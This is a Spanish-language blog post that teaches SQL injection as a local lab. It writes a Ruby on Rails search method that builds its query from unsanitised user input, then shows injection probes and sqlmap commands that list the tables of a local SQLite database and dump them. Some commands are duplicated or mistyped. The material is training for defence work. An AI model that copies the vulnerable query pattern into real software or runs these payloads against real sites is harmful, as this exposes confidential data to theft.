---
layout: post
title:  "SQL Inyection On Rails"
date:   2016-04-26 00:37:19 -0300
categories: jekyll update
---
El siguiente laboratorio tiene como objetivo comprender uno de los ataque más populares en aplicaciones web, Inyección SQL, como muchos sabrán una inyección sql tiene como objetivo hacer consultas a la base de datos mediante la manipulación de los parámetros evitando la autorización del administrador,pudiendo obtener la manipulación y extracción de datos confidenciales que pueden comprometer el modelo de negocio de la compañía.

A continuación vamos a crear una aplicación en Ruby on Rails:

```
rails new My-Application
```
Para este ejemplo crearemos un modelo para el usuario con un atributo name:string

```
rails g model user name:string
```

Además agregaremos un método,cuya función será buscar usuarios por el atributo name.
{% highlight ruby %}
def search(params)
 User.where("name LIKE '#{params}'")
end
{% endhighlight %}

Ahora que ya creamos nuestro primer método vulnerable, vamos a descubrir vulnerabilidad, para ello podemos realizar las siguientes pruebas:

```
localhost:3000/search/1 and 1 = 1 --
localhost:3000/search/1 and sleep(10)
sqlmap -u = “localhost:3000/tests/*” --dbms=”SQLite” --risk=”3” --level= “5”
```

Si un usuario malicioso entra ' OR 1 -- , la consulta SQL resultante será :
```
SELECT * FROM users WHERE name = '' OR 1 --'
```

Explotamos vulnerabilidad

```
sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 --dbs
sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 --dbs
sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 --tables
sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 -T inyections --dump -v 3
```

Ayuda SQLMAP.

```
/sqlmap.py -u URL --dbs/ 
/sqlmap.py -u URL -D --table    
/sqlmap.py -u URL -D -T -columns
/sqlmap.py -u URL -D -T -C --dump


-D:Base de datos
-T:Tablas
-C:Columnas
-U:Usurio

--table 
--columns
--dump
```